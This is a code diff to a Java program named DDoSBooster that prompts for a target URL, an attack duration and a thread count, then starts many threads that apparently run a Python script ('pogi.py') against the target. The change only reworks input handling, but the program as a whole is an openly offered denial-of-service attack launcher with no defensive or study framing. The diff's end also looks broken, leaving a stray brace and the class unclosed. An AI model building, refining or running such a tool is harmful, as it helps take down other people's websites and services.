@@ -6,14 +6,26 @@ public class DDoSBooster {
     private static final String PYTHON_SCRIPT = "python pogi.py";
 
     public static void main(String[] args) {
-        // Input from user
-        String targetUrl = getUserInput("Enter the target URL (e.g., http://example.com): ");
-        int duration = Integer.parseInt(getUserInput("Enter attack duration in seconds: "));
-        int numThreads = Integer.parseInt(getUserInput("Enter number of threads: "));
+        try {
+            // Input from user
+            BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
 
-        // Start the Python script
-        for (int i = 0; i < numThreads; i++) {
-            new Thread(new ScriptRunner(targetUrl, duration, numThreads)).start();
+            System.out.print("Enter the target URL (e.g., http://example.com): ");
+            String targetUrl = reader.readLine();
+
+            System.out.print("Enter attack duration in seconds: ");
+            int duration = Integer.parseInt(reader.readLine());
+
+            System.out.print("Enter number of threads: ");
+            int numThreads = Integer.parseInt(reader.readLine());
+
+            // Start the booster threads
+            for (int i = 0; i < numThreads; i++) {
+                new Thread(new ScriptRunner(targetUrl, duration, numThreads)).start();
+            }
+
+        } catch (IOException e) {
+            e.printStackTrace();
         }
     }
 
@@ -50,16 +62,5 @@ public class DDoSBooster {
             }
         }
     }
-
-    // Helper method to get user input
-    private static String getUserInput(String prompt) {
-        System.out.print(prompt);
-        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
-        try {
-            return reader.readLine();
-        } catch (IOException e) {
-            e.printStackTrace();
-            return "";
         }
-    }
-}
+        
